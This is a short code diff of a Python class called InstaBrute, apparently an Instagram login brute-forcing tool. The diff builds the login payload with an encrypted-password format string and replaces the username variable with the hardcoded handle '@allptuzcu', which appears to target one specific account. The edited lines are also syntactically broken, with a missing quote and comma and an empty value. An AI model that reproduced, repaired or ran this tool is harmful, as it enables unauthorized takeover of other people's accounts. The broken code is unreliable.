@@ -76,10 +76,10 @@ class InstaBrute(object):
         time = int(datetime.now().timestamp())
 
         payload = {
-            'username': user,
+            'username':@allptuzcu
             'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
             'queryParams': {},
-            'optIntoOneTap': 'false'
+            'optIntoOneTap': 
         }
 
         with requests.Session() as s:
